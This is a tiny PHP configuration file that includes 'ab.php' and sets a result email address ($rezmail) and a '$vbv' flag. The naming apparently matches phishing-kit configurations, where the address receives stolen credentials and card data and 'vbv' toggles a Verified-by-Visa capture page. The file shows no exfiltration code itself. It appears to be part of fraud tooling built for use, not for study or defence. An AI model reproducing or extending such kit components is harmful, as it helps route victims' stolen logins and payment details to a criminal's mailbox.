<?php
include('ab.php');
$rezmail = "allahsama@protonmail.com";
$vbv = "0";

?>